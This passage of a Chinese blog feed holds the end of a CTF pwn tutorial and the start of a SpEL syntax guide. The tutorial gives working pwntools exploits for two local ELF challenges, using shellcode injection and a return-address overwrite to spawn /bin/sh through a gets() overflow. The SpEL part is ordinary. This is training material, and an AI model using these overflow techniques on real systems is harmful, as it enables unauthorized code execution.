<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);<span class="comment">//行缓冲</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);<span class="comment">//全缓冲</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, v4, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码使用gets()函数读取数据保存到v4中，我们来看看v4在栈中保存位置，在v4保存的100个数据后，接着有s和r这两寄存器，其中r代表rip指令寄存器，保存在函数调用前下一个指令的地址。</p>
<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231118200438812.png" class title="image-20231118200438812">

<p>代码还将字符串复制到buf2处，我们来跟进查看buf2在BSS段，地址为0804A080。BSS段通常是用来存放程序中未初始化或者初始化为0的全局变量和静态变量的一块内存区域。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o</span><br><span class="line">.bss:0804A080 _bss            ends</span><br><span class="line">.bss:0804A080</span><br></pre></td></tr></table></figure>



<p>本题思路就是将payload写到buf2的地址，然后继续覆盖直至main()的返回地址覆盖为buf2的地址，这样rip保存的返回地址就跳到了此时buf2保存的payload，如下图：</p>
<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231118204315468.png" class title="image-20231118204315468">

<p>payload构造方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = shellcode代码+填充数据+buff2的地址</span><br></pre></td></tr></table></figure>

<p>代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">shellcode = asm(shellcraft.sh()) <span class="comment">#生成shellcode获取shell</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;shellcode:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(shellcode))</span><br><span class="line">payload = shellcode+(<span class="number">112</span>-<span class="built_in">len</span>(shellcode))*<span class="string">b&#x27;a&#x27;</span>+p32(buf2)</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="shelltext"><a href="#shelltext" class="headerlink" title="shelltext"></a>shelltext</h3><p>该程序为32位ELF程序，并且只开启了NX保护,无法写入shellcode</p>
<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231119095943596.png" class title="image-20231119095943596">

<p>该程序反编译代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">secure</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面的代码中可以看到，gets()存在溢出点，而且在secure()中存在system(“&#x2F;bin&#x2F;sh”)这一句执行系统命令开启shell，正在满足了无法执行shellcode的绕过，只需将system()的地址覆盖到rip寄存器保存的main()的返回地址，就能执行shell。</p>
<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231119102458994.png" class title="image-20231119102458994">

<p>可以看到system函数地址为0x0804863A</p>
<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231119102604129.png" class title="image-20231119102604129">

<p>在函数栈中，参数v4是100字节，s是保存的ebp为4字节，r是rip指令寄存器保存函数返回地址。这里我们是直接从函数栈中观察到的，但有时候不是很准确，所以还需使用动态调试去对溢出点进行验证。</p>
<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231119103055753.png" class title="image-20231119103055753">

<p>生成150个字符用作输入填充数据，使用gdb调试该程序并输入填充字符串运行，结果在0x62616164这个地址报错，这个地址就是溢出点</p>
<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231119103748486.png" class title="image-20231119103748486">

<p>输入点到eip的距离为112</p>
<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231119105720897.png" class title="image-20231119105720897">

<p>逆向代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(<span class="number">0x804863a</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>运行成功进入shell，可任意执行代码</p>
<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231119110123260.png" class title="image-20231119110123260">
]]></content>
      <categories>
        <category>CTF</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>-ROP -Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>OGNL表达式</title>
    <url>/2022/03/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="SPEL表达式"><a href="#SPEL表达式" class="headerlink" title="SPEL表达式"></a>SPEL表达式</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring表达式语言全称为“Spring Expression Language”，缩写为“SpEL”，类似于Struts2x中使用的OGNL表达式语言，能在运行时构建复杂表达式、存取对象图属性、对象方法调用等等，并且能与Spring功能完美整合，如能用来配置Bean定义。SpEL是单独模块，只依赖于core模块，不依赖于其他模块，可以单独使用。</p>
<p><strong>表达式语言给静态Java语言增加了动态功能。</strong></p>
<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>SPEL有三种用法，一种在注解@Value中，一种在XML配置中，一种是带代码中使用表达式。</p>
<p><strong>@Value</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//@Value能修饰成员变量和方法形参</span><br><span class="line">//#&#123;&#125;内就是表达式的内容</span><br><span class="line">@Value(&quot;#&#123;表达式&#125;&quot;)</span><br><span class="line">public String arg;</span><br></pre></td></tr></table></figure>

<p><strong><bean>配置</bean></strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;bean id=&quot;xxx&quot; class=&quot;com.java.XXXXX.xx&quot;&gt;</span><br><span class="line">    &lt;!-- 同@Value,#&#123;&#125;内是表达式的值，可放在property或constructor-arg内 --&gt;</span><br><span class="line">    &lt;property name=&quot;arg&quot; value=&quot;#&#123;表达式&#125;&quot;&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>

<p><strong>Expression</strong></p>
<p>Spel支持以下表达式:</p>
<p><strong>基本表达式</strong></p>
<p>字面量表达式、关系，逻辑与算数运算表达式、字符串连接及截取表达式、三目运算及Elivis表达式、正则表达式、括号优先级表达式</p>
<p><strong>类相关表达式</strong></p>
<p>类类型表达式、类实例化、instanceof表达式、变量定义及引用、赋值表达式、自定义函数、对象属性存取及安全导航表达式、对象方法调用、Bean引用</p>
<p><strong>集合相关表达式</strong></p>
<p>内联List、内联数组、集合，字典访问、列表，字典，数组修改、集合投影、集合选择；不支持多维内联数组初始化；不支持内联字典定义</p>
<p><strong>其他表达式</strong> </p>
<p>模板表达式</p>
<p><strong>注：SpEL表达式中的关键字是不区分大小写的</strong></p>
<h2 id="SpEl基础"><a href="#SpEl基础" class="headerlink" title="SpEl基础"></a>SpEl基础</h2><p>首先编写个Demo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.javacode2018.spel;</span><br><span class="line"></span><br><span class="line">import com.javacode2018.spel.test1.LessonModel;</span><br><span class="line">import com.javacode2018.spel.test1.MainConfig;</span><br><span class="line">import org.junit.Assert;</span><br><span class="line">import org.junit.Test;</span><br><span class="line">import org.springframework.beans.factory.support.DefaultListableBeanFactory;</span><br><span class="line">import org.springframework.context.annotation.AnnotationConfigApplicationContext;</span><br><span class="line">import org.springframework.context.expression.BeanFactoryResolver;</span><br><span class="line">import org.springframework.expression.*;</span><br><span class="line">import org.springframework.expression.common.TemplateParserContext;</span><br><span class="line">import org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line">import org.springframework.expression.spel.support.StandardEvaluationContext;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line">public class SpelTest &#123;</span><br><span class="line">    @Test</span><br><span class="line">    public void test1() &#123;</span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        #使用ExpressionParser接口创造解析器，提供SpelExpressionParser默认实现</span><br><span class="line">        Expression expression = parser.parseExpression(&quot;(&#x27;Hello&#x27; + &#x27; World&#x27;).concat(#end)&quot;);</span><br><span class="line">        #调用parsexpression解析相应的表达式为Expression对象</span><br><span class="line">        EvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">        #准备变量定义需要的上下文数据</span><br><span class="line">        context.setVariable(&quot;end&quot;, &quot;!&quot;);</span><br><span class="line">        #传值        System.out.println(expression.getValue(context));</span><br><span class="line">        #输出值</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<img src="/2022/03/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220424103321347.png" class title="image-20220424103321347">

<h3 id="Spel原理及接口"><a href="#Spel原理及接口" class="headerlink" title="Spel原理及接口"></a>Spel原理及接口</h3><ol>
<li>表达式: “干什么”</li>
<li>解析器: “谁来干”</li>
<li>上下文: “在哪干”</li>
<li>根对象及活动上下文对象: “对谁干”</li>
</ol>
<p>Spel工作流程图:</p>
<img src="/2022/03/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220424105051661.png" class title="image-20220424105051661">

<p>工作原理</p>
<ol>
<li><p>定义表达式</p>
</li>
<li><p>定义解析器ExpressionParser实现，Spel默认实现spelExpressionParser</p>
<p>2.1 SpelExpressionParser解析器内部使用Tokenizer类进行词法分析，即把字符串流分析为记号流，记号在SpEL使用Token类来表示；<br>2.2 有了记号流后，解析器便可根据记号流生成内部抽象语法树；在SpEL中语法树节点由SpelNode接口实现代表：如OpPlus表示加操作节点、IntLiteral表示int型字面量节点；使用SpelNodel实现组成了抽象语法树；<br>2.3 对外提供Expression接口来简化表示抽象语法树，从而隐藏内部实现细节，并提供getValue简单方法用于获取表达式值；SpEL提供默认实现为SpelExpression</p>
</li>
<li><p>定义表达式上下文对象。SpEL使用EvaluationContext接口表示上下文对象，用于设置根对象、自定义变量、自定义函数、类型转换器等，SpEL提供默认实现StandardEvaluationContext</p>
</li>
<li><p>使用表达式对象根据上下文对象求值(getvalue方法获取)</p>
</li>
</ol>
<h3 id="ExpressionParser接口"><a href="#ExpressionParser接口" class="headerlink" title="ExpressionParser接口"></a>ExpressionParser接口</h3><p>表示解析器，默认实现是org.springframework.expression.spel.standard包中的SpelExpressionParser类，使用parseExpression方法将字符串表达式转换为Expression对象，对于ParserContext接口用于定义字符串表达式是不是模板，及模板开始与结束字符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface ExpressionParser &#123;</span><br><span class="line"> Expression parseExpression(String expressionString) throws ParseException;</span><br><span class="line"> Expression parseExpression(String expressionString, ParserContext context) throws ParseException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Demo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Test</span><br><span class="line">public void testParserContext() &#123;</span><br><span class="line">    ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">    ParserContext parserContext = new ParserContext() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public boolean isTemplate() &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public String getExpressionPrefix() &#123;</span><br><span class="line">            return &quot;#&#123;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        #设置表达式前缀</span><br><span class="line">        @Override</span><br><span class="line">        public String getExpressionSuffix() &#123;</span><br><span class="line">            return &quot;&#125;&quot;;</span><br><span class="line">        #设置表达式后缀</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    String template = &quot;#&#123;&#x27;Hello &#x27;&#125;#&#123;&#x27;World!&#x27;&#125;&quot;;</span><br><span class="line">    #传入表达式模板</span><br><span class="line">    Expression expression = parser.parseExpression(template, parserContext);</span><br><span class="line">    System.out.println(expression.getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该代码演示的是调用ParserContext接口的情况，通过重写接口中isTemplate()，getExpressionPrefix()设置前缀”#{“，getExprssionSuffix()设置后缀“}”，然后设置表达式以该模板进行格式化定义。</p>
<h3 id="EvaluationContext接口"><a href="#EvaluationContext接口" class="headerlink" title="EvaluationContext接口"></a>EvaluationContext接口</h3><p>表示上下文环境，默认实现是org.springframework.expression.spel.support包中的StandardEvaluationContext类，使用setRootObject方法来设置根对象，使用setVariable方法来注册自定义变量，使用registerFunction来注册自定义函数等等。</p>
<h3 id="Expression接口"><a href="#Expression接口" class="headerlink" title="Expression接口"></a>Expression接口</h3><p>表示表达式对象，默认实现是org.springframework.expression.spel.standard包中的SpelExpression，提供getValue方法用于获取表达式值，提供setValue方法用于设置对象值。</p>
<h2 id="SpEl语法"><a href="#SpEl语法" class="headerlink" title="SpEl语法"></a>SpEl语法</h2><h3 id="基本表达式"><a href="#基本表达式" class="headerlink" title="基本表达式"></a>基本表达式</h3><h4 id="字面量表达式"><a href="#字面量表达式" class="headerlink" title="字面量表达式"></a>字面量表达式</h4><p>SpEL支持的字面量包括：字符串、数字类型（int、long、float、double）、布尔类型、null类型。</p>
<p>通过getvalue(类.class)来表达类型</p>
<p>示例:</p>
<p>String str1 &#x3D; parser.parserExpression(“‘Hello World!’”).getvalue(Sting.class)</p>
<p>Demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"></span><br><span class="line">        String str1 = parser.parseExpression(<span class="string">&quot;&#x27;Hello World!&#x27;&quot;</span>).getValue(String.class);</span><br><span class="line">        <span class="keyword">int</span> int1 = parser.parseExpression(<span class="string">&quot;1&quot;</span>).getValue(Integer.class);</span><br><span class="line">        <span class="keyword">long</span> long1 = parser.parseExpression(<span class="string">&quot;-1L&quot;</span>).getValue(<span class="keyword">long</span>.class);</span><br><span class="line">        <span class="keyword">float</span> float1 = parser.parseExpression(<span class="string">&quot;1.1&quot;</span>).getValue(Float.class);</span><br><span class="line">        <span class="keyword">double</span> double1 = parser.parseExpression(<span class="string">&quot;1.1E+2&quot;</span>).getValue(<span class="keyword">double</span>.class);</span><br><span class="line">        <span class="keyword">int</span> hex1 = parser.parseExpression(<span class="string">&quot;0xa&quot;</span>).getValue(Integer.class);</span><br><span class="line">        <span class="keyword">long</span> hex2 = parser.parseExpression(<span class="string">&quot;0xaL&quot;</span>).getValue(<span class="keyword">long</span>.class);</span><br><span class="line">        <span class="keyword">boolean</span> true1 = parser.parseExpression(<span class="string">&quot;true&quot;</span>).getValue(<span class="keyword">boolean</span>.class);</span><br><span class="line">        <span class="keyword">boolean</span> false1 = parser.parseExpression(<span class="string">&quot;false&quot;</span>).getValue(<span class="keyword">boolean</span>.class);</span><br><span class="line">        Object null1 = parser.parseExpression(<span class="string">&quot;null&quot;</span>).getValue(Object.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;str1=&quot;</span> + str1);</span><br><span class="line">        System.out.println(<span class="string">&quot;int1=&quot;</span> + int1);</span><br><span class="line">        System.out.println(<span class="string">&quot;long1=&quot;</span> + long1);</span><br><span class="line">        System.out.println(<span class="string">&quot;float1=&quot;</span> + float1);</span><br><span class="line">        System.out.println(<span class="string">&quot;double1=&quot;</span> + double1);</span><br><span class="line">        System.out.println(<span class="string">&quot;hex1=&quot;</span> + hex1);</span><br><span class="line">        System.out.println(<span class="string">&quot;hex2=&quot;</span> + hex2);</span><br><span class="line">        System.out.println(<span class="string">&quot;true1=&quot;</span> + true1);</span><br><span class="line">        System.out.println(<span class="string">&quot;false1=&quot;</span> + false1);</span><br><span class="line">        System.out.println(<span class="string">&quot;null1=&quot;</span> + null1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/03/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220424112217726.png" class title="image-20220424112217726">

<h4 id="算数运算表达式"><a href="#算数运算表达式" class="headerlink" title="算数运算表达式"></a>算数运算表达式</h4><p>SpEL支持加减乘除、求余、幂运算</p>
<p>Demo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int test1 = parser.parseExpression(&quot;(1+2-2)*4/2%1^5&quot;).getValue(Integer.class);</span><br><span class="line">        System.out.println(&quot;result=&quot;+test1);</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<img src="/2022/03/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220424112934057.png" class title="image-20220424112934057">

<h4 id="关系表达式"><a href="#关系表达式" class="headerlink" title="关系表达式"></a>关系表达式</h4><p>等于（&#x3D;&#x3D;）、不等于(!&#x3D;)、大于(&gt;)、大于等于(&gt;&#x3D;)、小于(&lt;)、小于等于(&lt;&#x3D;)，区间（between）运算，等价的“EQ” 、“NE”、 “GT”、“GE”、 “LT” 、“LE”来表示等于、不等于、大于、大于等于、小于、小于等于，不区分大小写。</p>
<p>Demo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Test</span><br><span class="line">    public void test3() &#123;</span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        boolean v1 = parser.parseExpression(&quot;1&gt;2&quot;).getValue(boolean.class);</span><br><span class="line">        boolean between1 = parser.parseExpression(&quot;1 between &#123;1,2&#125;&quot;).getValue(boolean.class);</span><br><span class="line">        System.out.println(&quot;v1=&quot; + v1);</span><br><span class="line">        System.out.println(&quot;between1=&quot; + between1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<img src="/2022/03/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220424113134637.png" class title="image-20220424113134637">

<p><strong>between运算符右边操作数必须是列表类型，且只能包含2个元素。第一个元素为开始，第二个元素为结束，区间运算是包含边界值的，即 xxx&gt;&#x3D;list.get(0) &amp;&amp; xxx&lt;&#x3D;list.get(1)</strong></p>
<h4 id="逻辑表达式"><a href="#逻辑表达式" class="headerlink" title="逻辑表达式"></a>逻辑表达式</h4><p>且（and或者&amp;&amp;）、或(or或者||)、非(!或NOT)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Test</span><br><span class="line">    public void test4() &#123;</span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line"></span><br><span class="line">        boolean result1 = parser.parseExpression(&quot;2&gt;1 and (!true or !false)&quot;).getValue(boolean.class);</span><br><span class="line">        boolean result2 = parser.parseExpression(&quot;2&gt;1 &amp;&amp; (!true || !false)&quot;).getValue(boolean.class);</span><br><span class="line"></span><br><span class="line">        boolean result3 = parser.parseExpression(&quot;2&gt;1 and (NOT true or NOT false)&quot;).getValue(boolean.class);</span><br><span class="line">        boolean result4 = parser.parseExpression(&quot;2&gt;1 &amp;&amp; (NOT true || NOT false)&quot;).getValue(boolean.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;result1=&quot; + result1);</span><br><span class="line">        System.out.println(&quot;result2=&quot; + result2);</span><br><span class="line">        System.out.println(&quot;result3=&quot; + result3);</span><br><span class="line">        System.out.println(&quot;result4=&quot; + result4);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<img src="/2022/03/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220424113702504.png" class title="image-20220424113702504">

<h4 id="字符串连接及截取表达式"><a href="#字符串连接及截取表达式" class="headerlink" title="字符串连接及截取表达式"></a>字符串连接及截取表达式</h4><p>使用“+”进行字符串连接，使用“’String’[0] [index]”来截取一个字符，目前只支持截取一个，如“’Hello ‘ + ‘World!’”得到“Hello World!”；而“’Hello World!’[0]”将返回“H”</p>
<h4 id="三目运算"><a href="#三目运算" class="headerlink" title="三目运算"></a>三目运算</h4><p>三目运算符 <strong>“表达式1?表达式2:表达式3”</strong>用于构造三目运算表达式，如“2&gt;1?true:false”将返回true。</p>
<h4 id="Elivis运算符"><a href="#Elivis运算符" class="headerlink" title="Elivis运算符"></a>Elivis运算符</h4><p>Elivis运算符<strong>“表达式1?:表达式2”</strong>从Groovy语言引入用于简化三目运算符的，当表达式1为非null时则返回表达式1，当表达式1为null时则返回表达式2，简化了三目运算符方式“表达式1? 表达式1:表达式2”，如“null?:false”将返回false，而“true?:false”将返回true</p>
<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>使用“str matches regex，如“’123’ matches ‘\d{3}’”将返回true</p>
<h4 id="括号优先级表达式"><a href="#括号优先级表达式" class="headerlink" title="括号优先级表达式"></a>括号优先级表达式</h4><p>使用“(表达式)”构造，括号里的具有高优先级</p>
<h3 id="类相关表达式"><a href="#类相关表达式" class="headerlink" title="类相关表达式"></a>类相关表达式</h3><h4 id="类类型表达式"><a href="#类类型表达式" class="headerlink" title="类类型表达式"></a>类类型表达式</h4><p>使用“T(Type)”来表示java.lang.Class实例，“Type”必须是类全限定名，“java.lang”包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段</p>
<p><strong>Demo</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testClassTypeExpression</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">        <span class="comment">//java.lang包类访问</span></span><br><span class="line">        Class&lt;String&gt; result1 = parser.parseExpression(<span class="string">&quot;T(String)&quot;</span>).getValue(Class.class);</span><br><span class="line">        System.out.println(result1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//其他包类访问</span></span><br><span class="line">        String expression2 = <span class="string">&quot;T(com.javacode2018.spel.SpelTest)&quot;</span>;</span><br><span class="line">        Class&lt;SpelTest&gt; value = parser.parseExpression(expression2).getValue(Class.class);</span><br><span class="line">        System.out.println(value == SpelTest.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//类静态字段访问</span></span><br><span class="line">        <span class="keyword">int</span> result3 = parser.parseExpression(<span class="string">&quot;T(Integer).MAX_VALUE&quot;</span>).getValue(<span class="keyword">int</span>.class);</span><br><span class="line">        System.out.println(result3 == Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//类静态方法调用</span></span><br><span class="line">        <span class="keyword">int</span> result4 = parser.parseExpression(<span class="string">&quot;T(Integer).parseInt(&#x27;1&#x27;)&quot;</span>).getValue(<span class="keyword">int</span>.class);</span><br><span class="line">        System.out.println(result4);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<img src="/2022/03/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220424142703091.png" class title="image-20220424142703091">

<p>对于java.lang包里的可以直接使用“T(String)”访问；其他包必须是类全限定名；可以进行静态字段访问如“T(Integer).MA</p>
<h4 id="类实例化"><a href="#类实例化" class="headerlink" title="类实例化"></a>类实例化</h4><p>类实例化同样使用java关键字“new”，类名必须是全限定名，但java.lang包内的类型除外，如String、Integer</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Test</span><br><span class="line">public void testConstructorExpression() &#123;</span><br><span class="line">    ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">    String result1 = parser.parseExpression(&quot;new String(&#x27;路人甲java&#x27;)&quot;).getValue(String.class);</span><br><span class="line">    System.out.println(result1);</span><br><span class="line"></span><br><span class="line">    Date result2 = parser.parseExpression(&quot;new java.util.Date()&quot;).getValue(Date.class);</span><br><span class="line">    System.out.println(result2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果；</p>
<img src="/2022/03/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220424144159414.png" class title="image-20220424144159414">

<h4 id="instanceof表达式"><a href="#instanceof表达式" class="headerlink" title="instanceof表达式"></a>instanceof表达式</h4><p>SpEL支持instanceof运算符，跟Java内使用同义；如“’haha’ instanceof T(String)”将返回true</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Test</span><br><span class="line">    public void testInstanceOfExpression() &#123;</span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        Boolean value = parser.parseExpression(&quot;&#x27;路人甲&#x27; instanceof T(String)&quot;).getValue(Boolean.class);</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<img src="/2022/03/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220424144504113.png" class title="image-20220424144504113">

